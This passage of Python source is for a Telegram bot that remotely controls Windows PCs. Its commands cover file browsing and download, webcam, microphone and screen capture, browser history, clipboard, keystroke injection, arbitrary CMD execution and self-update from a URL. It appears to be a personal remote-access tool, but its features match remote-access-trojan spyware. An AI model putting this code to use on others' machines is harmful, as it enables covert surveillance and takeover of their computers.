def callback_fmcd(call):
    if not auth_cb(call): return
    idx = int(call.data.split("_")[1])
    path = fm_paths.get(call.message.chat.id, {}).get(idx)
    if not path:
        bot.answer_callback_query(call.id, "❌ Путь не найден"); return
    fm_cur[call.message.chat.id] = path
    markup = build_fm_keyboard(call.message.chat.id, path)
    try:
        bot.edit_message_text(f"📂 <b>{PC_NAME}</b>\n<code>{path}</code>",
                              call.message.chat.id, call.message.message_id,
                              parse_mode='HTML', reply_markup=markup)
    except Exception:
        bot.send_message(call.message.chat.id, f"📂 <code>{path}</code>",
                         parse_mode='HTML', reply_markup=markup)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("fmdl_"))
def callback_fmdl(call):
    if not auth_cb(call): return
    idx = int(call.data.split("_")[1])
    path = fm_paths.get(call.message.chat.id, {}).get(idx)
    if not path:
        bot.answer_callback_query(call.id, "❌ Файл не найден"); return
    bot.answer_callback_query(call.id, "📤 Отправляю...")
    try:
        size = os.path.getsize(path)
        if size > 50 * 1024 * 1024:
            bot.send_message(call.message.chat.id, "❌ Файл > 50 MB"); return
        with open(path, 'rb') as f:
            bot.send_document(call.message.chat.id, f, caption=f"📄 {os.path.basename(path)}")
    except Exception as e:
        bot.send_message(call.message.chat.id, f"❌ {e}")

@bot.callback_query_handler(func=lambda call: call.data == "noop")
def noop(call):
    bot.answer_callback_query(call.id)

@bot.message_handler(commands=['vol'])
def cmd_vol(message):
    if not is_authorized(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].isdigit():
        bot.reply_to(message, "Пример: /vol 50"); return
    route(message, "vol", parts[1])

@bot.message_handler(commands=['mute'])
def cmd_mute(message):
    if not is_authorized(message): return
    route(message, "mute")

@bot.message_handler(commands=['unmute'])
def cmd_unmute(message):
    if not is_authorized(message): return
    route(message, "unmute")

@bot.message_handler(commands=['shutdown'])
def cmd_shutdown(message):
    if not is_authorized(message): return
    target = get_selected(message.chat.id)
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton(f"✅ Выключить {target}", callback_data=f"power_shutdown_{target}"),
               InlineKeyboardButton("❌ Отмена", callback_data="power_cancel_"))
    bot.reply_to(message, f"⚠️ Выключить <b>{target}</b>?", reply_markup=markup, parse_mode='HTML')

@bot.message_handler(commands=['reboot'])
def cmd_reboot(message):
    if not is_authorized(message): return
    target = get_selected(message.chat.id)
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton(f"✅ Перезагрузить {target}", callback_data=f"power_reboot_{target}"),
               InlineKeyboardButton("❌ Отмена", callback_data="power_cancel_"))
    bot.reply_to(message, f"⚠️ Перезагрузить <b>{target}</b>?", reply_markup=markup, parse_mode='HTML')

@bot.message_handler(commands=['sleep'])
def cmd_sleep(message):
    if not is_authorized(message): return
    route(message, "sleep")

@bot.callback_query_handler(func=lambda call: call.data.startswith("power_"))
def callback_power(call):
    if not auth_cb(call): return
    parts = call.data.split("_", 2)
    action = parts[1]
    target = parts[2] if len(parts) > 2 else PC_NAME
    if action == "shutdown":
        bot.edit_message_text(f"✅ Выключаю <b>{target}</b>...", call.message.chat.id, call.message.message_id, parse_mode='HTML')
        if target == PC_NAME:
            subprocess.run(["shutdown", "/s", "/t", "5"])
        else:
            send_command_to_pc(target, "shutdown")
    elif action == "reboot":
        bot.edit_message_text(f"✅ Перезагружаю <b>{target}</b>...", call.message.chat.id, call.message.message_id, parse_mode='HTML')
        if target == PC_NAME:
            subprocess.run(["shutdown", "/r", "/t", "5"])
        else:
            send_command_to_pc(target, "reboot")
    elif action == "sleep":
        bot.edit_message_text(f"💤 Сплю <b>{target}</b>...", call.message.chat.id, call.message.message_id, parse_mode='HTML')
        if target == PC_NAME:
            subprocess.run(["rundll32.exe", "powrprof.dll,SetSuspendState", "0", "1", "0"])
        else:
            send_command_to_pc(target, "sleep")
    elif action == "cancel":
        bot.edit_message_text("❌ Отменено", call.message.chat.id, call.message.message_id)
    bot.answer_callback_query(call.id)

@bot.message_handler(commands=['mouse'])
def cmd_mouse(message):
    if not is_authorized(message): return
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "Пример: /mouse 500 300"); return
    route(message, "mouse", f"{parts[1]} {parts[2]}")

@bot.message_handler(commands=['click'])
def cmd_click(message):
    if not is_authorized(message): return
    parts = message.text.split()
    route(message, "click", f"{parts[1]} {parts[2]}" if len(parts) >= 3 else "")

@bot.message_handler(commands=['rclick'])
def cmd_rclick(message):
    if not is_authorized(message): return
    parts = message.text.split()
    route(message, "rclick", f"{parts[1]} {parts[2]}" if len(parts) >= 3 else "")

@bot.message_handler(commands=['scroll'])
def cmd_scroll(message):
    if not is_authorized(message): return
    parts = message.text.split()
    route(message, "scroll", parts[1] if len(parts) > 1 else "3")

@bot.message_handler(commands=['type'])
def cmd_type(message):
    if not is_authorized(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Пример: /type привет"); return
    route(message, "type", parts[1])

@bot.message_handler(commands=['key'])
def cmd_key(message):
    if not is_authorized(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Пример: /key ctrl+c"); return
    route(message, "key", parts[1])

@bot.message_handler(commands=['open'])
def cmd_open(message):
    if not is_authorized(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Пример: /open https://youtube.com"); return
    route(message, "open", parts[1])

@bot.message_handler(commands=['search'])
def cmd_search(message):
    if not is_authorized(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Пример: /search котики"); return
    route(message, "search", parts[1])

@bot.message_handler(commands=['clip'])
def cmd_clip(message):
    if not is_authorized(message): return
    route(message, "clip")

@bot.message_handler(commands=['notify'])
def cmd_notify(message):
    if not is_authorized(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Пример: /notify Привет!"); return
    route(message, "notify", parts[1])

@bot.message_handler(commands=['mic'])
def cmd_mic(message):
    if not is_authorized(message): return
    parts = message.text.split()
    route(message, "mic", parts[1] if len(parts) > 1 else "5")

@bot.message_handler(commands=['cam'])
def cmd_cam(message):
    if not is_authorized(message): return
    route(message, "cam")

@bot.message_handler(commands=['video'])
def cmd_video(message):
    if not is_authorized(message): return
    parts = message.text.split()
    route(message, "video", parts[1] if len(parts) > 1 else "5")


@bot.message_handler(commands=['record'])
def cmd_record(message):
    if not is_authorized(message): return
    parts = message.text.split()
    route(message, "record", parts[1] if len(parts) > 1 else "10")

@bot.message_handler(commands=['disks'])
def cmd_disks(message):
    if not is_authorized(message): return
    route(message, "disks")

@bot.message_handler(content_types=['document'])
def handle_upload(message):
    if not is_authorized(message): return
    target = get_selected(message.chat.id)
    # Спросить куда сохранить
    file_name = message.document.file_name
    markup = InlineKeyboardMarkup(row_width=1)
    default_path = f"C:\\Users\\LERA\\Downloads\\{file_name}"
    markup.add(
        InlineKeyboardButton(f"💾 Downloads\\{file_name}", callback_data=f"savefile_{default_path}"),
        InlineKeyboardButton("📁 Указать путь вручную", callback_data=f"savefile_custom_{file_name}")
    )
    bot.reply_to(message, 
        f"📤 Куда сохранить <b>{file_name}</b> на <b>{target}</b>?",
        parse_mode='HTML', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("savefile_"))
def callback_savefile(call):
    if not auth_cb(call): return
    import base64
    data = call.data[9:]
    if data.startswith("custom_"):
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "Напиши полный путь куда сохранить файл, например:\n<code>C:\\Users\\LERA\\Desktop\\файл.exe</code>", parse_mode='HTML')
        return
    save_path = data
    # Найти файл из предыдущего сообщения
    try:
        doc = call.message.reply_to_message.document
        file_info = bot.get_file(doc.file_id)
        downloaded = bot.download_file(file_info.file_path)
        encoded = base64.b64encode(downloaded).decode()
        target = get_selected(call.message.chat.id)
        bot.answer_callback_query(call.id, "📤 Отправляю на ПК...")
        if target == PC_NAME:
            threading.Thread(target=execute_command, args=("upload", f"{save_path}|{encoded}"), daemon=True).start()
        else:
            send_command_to_pc(target, "upload", f"{save_path}|{encoded}")
            bot.send_message(call.message.chat.id, f"📤 Файл отправлен на <b>{target}</b>...", parse_mode='HTML')
    except Exception as e:
        bot.send_message(call.message.chat.id, f"❌ Ошибка: {e}")


@bot.message_handler(commands=['ss_game', 'ssg'])
def cmd_ss_game(message):
    if not is_authorized(message): return
    route(message, "ss_game")

@bot.message_handler(commands=['history'])
def cmd_history(message):
    if not is_authorized(message): return
    parts = message.text.split(maxsplit=1)
    route(message, "history", parts[1] if len(parts) > 1 else "15")

@bot.callback_query_handler(func=lambda call: call.data.startswith("disc_"))
def callback_disconnect(call):
    if not auth_cb(call): return
    target = call.data[5:]
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("✅ Да, отключить", callback_data=f"dcon_{target}"),
        InlineKeyboardButton("❌ Отмена", callback_data="noop")
    )
    bot.edit_message_text(
        f"⚠️ Отключить удалённый доступ на <b>{target}</b>?\nБот закроется на том ПК.",
        call.message.chat.id, call.message.message_id,
        parse_mode='HTML', reply_markup=markup)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("dcon_"))
def callback_disconnect_confirm(call):
    if not auth_cb(call): return
    target = call.data[5:]
    bot.edit_message_text(f"🔌 Отключаю <b>{target}</b>...", call.message.chat.id, call.message.message_id, parse_mode='HTML')
    if target == PC_NAME:
        threading.Thread(target=execute_command, args=("disconnect",), daemon=True).start()
    else:
        send_command_to_pc(target, "disconnect")
    bot.answer_callback_query(call.id)

@bot.message_handler(commands=['disconnect'])
def cmd_disconnect(message):
    if not is_authorized(message): return
    target = get_selected(message.chat.id)
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("✅ Да, отключить", callback_data=f"dcon_{target}"),
        InlineKeyboardButton("❌ Отмена", callback_data="noop")
    )
    bot.reply_to(message,
        f"⚠️ Отключить удалённый доступ на <b>{target}</b>?\nБот закроется на том ПК.",
        parse_mode='HTML', reply_markup=markup)

@bot.message_handler(commands=['rename'])
def cmd_rename(message):
    if not is_authorized(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Пример: /rename Домашний ПК"); return
    route(message, "rename", parts[1])

@bot.message_handler(commands=['update'])
def cmd_update(message):
    if not is_authorized(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Пришли ссылку: /update https://example.com/bot.pyw"); return
    target = get_selected(message.chat.id)
    if target == PC_NAME:
        threading.Thread(target=execute_command, args=("update", parts[1]), daemon=True).start()
    else:
        send_command_to_pc(target, "update", parts[1])
        bot.reply_to(message, f"📤 Команда обновления отправлена на <b>{target}</b>...", parse_mode='HTML')

@bot.message_handler(commands=['cmd'])
def cmd_cmd(message):
    if not is_authorized(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Пример: /cmd ipconfig"); return
    route(message, "cmd", parts[1])

# ─── Запуск ───────────────────────────────────────────────

# Устанавливаем меню команд в Telegram
try:
    from telebot.types import BotCommand, BotCommandScopeDefault
    bot.set_my_commands([
        BotCommand("start",    "📋 Список всех команд"),
        BotCommand("pcs",      "🖥 Выбрать ПК"),
        BotCommand("ss",       "📸 Скриншот"),
        BotCommand("ssg",      "🎮 Скриншот (игры/DirectX)"),
        BotCommand("sysinfo",  "📊 Инфо о системе"),
        BotCommand("tasks",    "⚙️ Процессы"),
        BotCommand("files",    "📂 Файловый менеджер"),
        BotCommand("disks",    "💿 Диски"),
        BotCommand("history",  "📝 История браузера"),
        BotCommand("record",   "🎥 Запись экрана"),
        BotCommand("cam",      "📷 Фото с камеры"),
        BotCommand("video",    "🎬 Видео с камеры"),
        BotCommand("mic",      "🎤 Запись микрофона"),
        BotCommand("vol",      "🔊 Громкость"),
        BotCommand("mute",     "🔇 Выключить звук"),
        BotCommand("unmute",   "🔈 Включить звук"),
        BotCommand("search",   "🔍 Поиск в Google"),
        BotCommand("open",     "🌐 Открыть сайт/программу"),
        BotCommand("type",     "⌨️ Напечатать текст"),
        BotCommand("key",      "⌨️ Нажать клавишу"),
        BotCommand("click",    "🖱 Клик мышью"),
        BotCommand("mouse",    "🖱 Переместить мышь"),
        BotCommand("clip",     "📋 Буфер обмена"),
        BotCommand("notify",   "🔔 Уведомление на ПК"),
        BotCommand("cmd",      "💻 CMD команда"),
        BotCommand("shutdown", "⛔ Выключить ПК"),
        BotCommand("reboot",   "🔄 Перезагрузить"),
        BotCommand("sleep",    "💤 Спящий режим"),
        BotCommand("update",   "⬆️ Обновить бота"),
    ])
except Exception:
    pass

bot.polling(none_stop=True, interval=1)
